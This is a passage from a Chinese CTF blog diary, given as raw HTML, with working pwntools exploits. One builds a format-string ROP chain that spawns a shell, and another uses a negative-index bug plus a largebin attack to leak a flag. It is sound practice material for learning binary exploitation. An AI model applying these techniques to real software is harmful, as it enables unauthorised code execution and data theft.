class="hljs-string">&#x27;stack:&#x27;</span>,hex(<span class="hljs-built_in">stack</span>))<br><br>pop_rdi=<span class="hljs-number">0x000000000002a3e5</span>+libc_addr<br>sys=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_addr<br>binsh=next(libc.search(b<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))+libc_addr<br><br>pop_rdi_low=pop_rdi&amp;<span class="hljs-number">0xff</span><br>pop_rdi_mid=(pop_rdi&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>pop_rdi_high=(pop_rdi&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br><br><br>payload1=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(pop_rdi_low).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x38</span>)<br>key1=(b<span class="hljs-string">&#x27;aaa%1$p.%19$p&#x27;</span>).ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>)<br>strings(payload1,key1)<br>payload2=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(pop_rdi_mid).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x39</span>)<br>strings(payload2,payload1.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload3=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(pop_rdi_high).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x3a</span>)<br>strings(payload3,payload2.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br><br>binsh1=binsh&amp;<span class="hljs-number">0xff</span><br>binsh2=(binsh&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>binsh3=(binsh&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>binsh4=(binsh&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span><br>binsh5=(binsh&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xff</span><br>binsh6=(binsh&gt;&gt;<span class="hljs-number">40</span>)&amp;<span class="hljs-number">0xff</span><br><br>payload4=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(binsh1).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x40</span>)<br>strings(payload4,payload3.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload5=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(binsh2).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x41</span>)<br>strings(payload5,payload4.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload6=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(binsh3).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x42</span>)<br>strings(payload6,payload5.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload7=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(binsh4).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x43</span>)<br>strings(payload7,payload6.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload8=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(binsh5).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x44</span>)<br>strings(payload8,payload7.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload9=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(binsh6).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x45</span>)<br>strings(payload9,payload8.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br><br>ret=pop_rdi+<span class="hljs-number">1</span><br><br>ret1=ret&amp;<span class="hljs-number">0xff</span><br>ret2=(ret&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>ret3=(ret&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>ret4=(ret&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span><br>ret5=(ret&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xff</span><br>ret6=(ret&gt;&gt;<span class="hljs-number">40</span>)&amp;<span class="hljs-number">0xff</span><br><br>payload10=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(ret1).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x48</span>)<br>strings(payload10,payload9.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload11=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(ret2).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x49</span>)<br>strings(payload11,payload10.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload12=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(ret3).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x4a</span>)<br>strings(payload12,payload11.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload13=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(ret4).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x4b</span>)<br>strings(payload13,payload12.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload14=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(ret5).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x4c</span>)<br>strings(payload14,payload13.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload15=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(ret6).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x4d</span>)<br>strings(payload15,payload14.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br><br>sys1=sys&amp;<span class="hljs-number">0xff</span><br>sys2=(sys&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>sys3=(sys&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>sys4=(sys&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span><br>sys5=(sys&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xff</span><br>sys6=(sys&gt;&gt;<span class="hljs-number">40</span>)&amp;<span class="hljs-number">0xff</span><br><br>payload16=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(sys1).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x50</span>)<br>strings(payload16,payload15.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload17=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(sys2).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x51</span>)<br>strings(payload17,payload16.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload18=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(sys3).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x52</span>)<br>strings(payload18,payload17.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload19=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(sys4).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x53</span>)<br>strings(payload19,payload18.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload20=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(sys5).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x54</span>)<br>strings(payload20,payload19.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br>payload21=(<span class="hljs-string">&#x27;%&#123;&#125;c%14$hhn&#x27;</span>.format(sys6).encode()).ljust(<span class="hljs-number">0x10</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(<span class="hljs-built_in">stack</span>+<span class="hljs-number">0x55</span>)<br>strings(payload21,payload20.ljust(<span class="hljs-number">32</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>))<br><br><span class="hljs-meta"># gdb.attach(io)</span><br><br>leave()<br><br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>感觉自己的脚本有点丑陋了，本来应该写循环来实现的，但是，vscode的自动补全太好用了，一直tab就打完了，所以就没用循环。</p>
+<h2 id="2025-11-26——阴间CTF-CMWL"><a href="#2025-11-26——阴间CTF-CMWL" class="headerlink" title="2025.11.26——阴间CTF_CMWL"></a>2025.11.26——阴间CTF_CMWL</h2><p>只能分配largebin大小的chunk，限制了free次数为2次，write次数为1次，感觉应该也可以用house of apple吧，这个有沙箱，怎么现在的题都会加沙箱了吗，已经好久没有遇到没有沙箱的题目了。</p>
+<p>打算先用house of apple去试试。</p>
+<p>（拖欠………)</p>
+<p>不知道为什么我感觉明明构造好了但是exit的时候没有进入链子（疲惫）明天在调调吧</p>
+<h2 id="2025-11-27——pwn"><a href="#2025-11-27——pwn" class="headerlink" title="2025.11.27——pwn"></a>2025.11.27——pwn</h2><p>看了一下今天一个比赛的题，也没有名字，就干脆叫pwn了，没想到pwn竟然在运维赛道里面。</p>
+<p>我当时一看这个题，就感觉应该是打house of apple，但是又给了我一个函数的的地址（可以算出起始地址）。我仔细一看，虽然开了沙箱，但是flag已经打开了直接放到堆里面了然后在放到了bss段上，然后当一个段上的数据满足条件，就可以直接输出flag。</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127203803-02nvlnp.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>堆块操作除了限制只能创建15个堆块以外，几乎没什么限制。</p>
+<p>感觉很迷茫，倒不是做不出来，只是不知道到底想考什么，如果想考house of apple，给一个gift给我是要干什么呢，而且可以直接执行write输出堆上数据，不需要那个输出flag的函数了。如果选择覆盖bss段一段数据，直接输出flag，使用largebin attack，那么可以分配的chunk又不够。</p>
+<p>（由于我这两天调house of apple的链子调得有点死了，所以不是很想使用house of apple去打）</p>
+<p>（可能是因为我能力问题吧，我确实不知道出题人想考什么知识点）</p>
+<p>但是看着在bss段和chunk里面的flag确实试心痒难耐啊，看得到，拿不到</p>
+<p>于是我发现</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127212129-mnu36au.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127212139-v6jeq11.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>edit和show里面都没有检查n的合法行，而且n还是int类型，那么就可以直接写负数。</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127212823-sun1gmq.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>而0x55963aaf9008的地址刚好指向我自己（其实是因为我找了好久），如果我们索引到这，就可以往这读写，直接使用show的话，只有0x50,刚好在flag上面停住了，所以我们可以从这开始写。</p>
+<p>这时候我们只需呀使用largebin attack把存储大小的地方修改为一个大数，就可以覆盖到索引输出chunk的地方，修改为flag的chunk就可以直接输出flag了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import*<br><br><span class="hljs-title function_">context</span><span class="hljs-params">(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)</span><br>io=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>def add(size,data):#<span class="hljs-number">0x400</span><span class="hljs-number">-0x500</span><br>    io.sendlineafter(b<span class="hljs-string">&#x27;5.exit\n&#x27;</span>,b<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;input size&gt;&gt;&#x27;</span>,str(size))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;input data&gt;&gt;&#x27;</span>,data)<br>    <br><br>def edit(index,data):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;5.exit\n&#x27;</span>,b<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;input index&gt;&gt;&#x27;</span>,str(index))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;input data&gt;&gt;&#x27;</span>,data)<br>    <br>def show(index):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;5.exit\n&#x27;</span>,b<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;input index&gt;&gt;&#x27;</span>,str(index))<br><br>def dele(index):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;5.exit\n&#x27;</span>,b<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;input index&gt;&gt;&#x27;</span>,str(index))<br>    <br>io.recvuntil(b<span class="hljs-string">&#x27;gift:\n&#x27;</span>)<br>data=<span class="hljs-type">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br>print(hex(data))<br>start=data<span class="hljs-number">-0x1a44</span><br>print(<span class="hljs-string">&quot;start:&quot;</span>,hex(start))<br><br>target=start+<span class="hljs-number">0x4088</span><br><br>add(<span class="hljs-number">0x430</span>,b<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x450</span>,b<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x450</span>,b<span class="hljs-string">&#x27;2&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x450</span>,b<span class="hljs-string">&#x27;3&#x27;</span>*<span class="hljs-number">0x20</span>)<br><br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x470</span>,b<span class="hljs-string">&#x27;4&#x27;</span>*<span class="hljs-number">0x20</span>)<br>show(<span class="hljs-number">2</span>)<br>io.recvuntil(b<span class="hljs-string">&#x27;data&gt;&gt;\n&#x27;</span>)<br>libc_addr=u64(io.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>io.recv(<span class="hljs-number">8</span>)<br>heap=u64(io.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>heap-=<span class="hljs-number">0x000055925fe0ed20</span><span class="hljs-number">-0x55925fe0d000</span><br>offset=<span class="hljs-number">0x00007f137d5ff0e0</span> - <span class="hljs-number">0x7f137d3e4000</span><br>libc_addr-=offset<br>print(<span class="hljs-string">&quot;libc；&quot;</span>,hex(libc_addr))<br>print(<span class="hljs-string">&quot;heap:&quot;</span>,hex(heap))<br>dele(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">2</span>,p64(libc_addr+offset)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0</span>)+p64(target<span class="hljs-number">-0x20</span>))<br>add(<span class="hljs-number">0x470</span>,b<span class="hljs-string">&#x27;5&#x27;</span>*<span class="hljs-number">0x20</span>)<br><br><span class="hljs-built_in">stdout</span>=libc_addr+libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br><span class="hljs-built_in">stdin</span>=libc_addr+libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br><span class="hljs-built_in">stderr</span>=libc_addr+libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stderr_&#x27;</span>]<br>gdb.attach(io)<br>payload=p64(target)+b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-built_in">stdout</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-built_in">stdin</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-built_in">stderr</span>)+p64(<span class="hljs-number">0</span>)+b<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x70</span>+p64(heap+<span class="hljs-number">0x480</span>)<br>edit(<span class="hljs-number">-23</span>,payload)<br>show(<span class="hljs-number">0</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251127213359-s76r30j.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>果然还是题目不严谨，才能这么做吧</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="category-chain-item">刷题记录</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>今天还没pwn吗</div>
+      <div>http://example.com/post/haven-t-pwned-yet-today-1ucsvd.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>N1mbus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月20日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年11月20日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/fork-and-proc-files-1q6or4.html" title="fork和proc文件">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">fork和proc文件</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/turing-complete----ji-cun-qi-zhi-jian-ziybm1.html" title="Turing Complete——寄存器之间">
+                        <span class="hidden-mobile">Turing Complete——寄存器之间</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"HGQ2AAsXTVipJuHOCxNQPl8A-gzGzoHsz","appKey":"xkvgsYTbMeB59u2gc4HqxaBN","path":"window.location.pathname","placeholder":"说点什么吧","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
